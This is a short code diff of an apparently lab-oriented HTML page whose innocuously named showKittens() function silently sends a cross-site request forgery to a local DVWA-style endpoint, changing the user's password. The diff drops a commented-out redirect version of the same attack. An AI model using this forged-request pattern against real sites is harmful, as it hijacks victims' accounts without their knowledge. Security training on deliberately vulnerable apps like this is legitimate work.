@@ -6,13 +6,9 @@
 
     <script type="application/javascript">
         function showKittens() {
-            // window.location = "http://localhost:8080/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change";
-
             const http = new XMLHttpRequest();
-            
             http.open("GET", "http://localhost:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change");
             http.send();
-            
             http.onload = () => console.log(http.responseText);
         }
     </script>
